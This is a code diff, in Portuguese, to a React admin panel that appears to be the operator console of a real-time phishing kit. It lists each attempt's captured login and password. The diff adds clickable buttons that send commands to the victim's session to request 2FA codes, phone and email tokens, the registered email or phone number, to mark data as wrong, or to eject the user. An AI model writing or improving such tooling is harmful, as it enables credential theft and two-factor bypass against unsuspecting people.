@@ -228,25 +228,58 @@ function AdminPanel() {
                           <th 
                             onClick={() => sendCommand(attempt.id, "INV")}
                             className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-purple-200 transition-colors"
+                            title="Clique para avisar que dados estão incorretos"
                           >
                             INV
                           </th>
                           <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">USUÁRIO/LOGIN</th>
                           <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">SENHA</th>
-                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">AUT</th>
-                          <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">EMAIL</th>
-                          <th className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-TEL</th>
-                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">Nº TELEFONE</th>
-                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-MAIL</th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "AUT")}
+                            className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-blue-200 transition-colors"
+                            title="Clique para pedir código 2FA"
+                          >
+                            AUT
+                          </th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "EMAIL")}
+                            className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-purple-200 transition-colors"
+                            title="Clique para pedir email cadastrado"
+                          >
+                            EMAIL
+                          </th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "TOK-TEL")}
+                            className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-orange-200 transition-colors"
+                            title="Clique para pedir código do telefone"
+                          >
+                            TOK-TEL
+                          </th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "TELEFONE")}
+                            className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-green-200 transition-colors"
+                            title="Clique para pedir número de telefone"
+                          >
+                            Nº TELEFONE
+                          </th>
+                          <th 
+                            onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
+                            className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-blue-200 transition-colors"
+                            title="Clique para pedir token do email"
+                          >
+                            TOK-MAIL
+                          </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "AGUARDE")}
                             className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-yellow-200 transition-colors"
+                            title="Clique para colocar em aguarde"
                           >
                             👍
                           </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "REDIRECT")}
                             className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-pink-200 transition-colors"
+                            title="Clique para expulsar usuário"
                           >
                             X
                           </th>
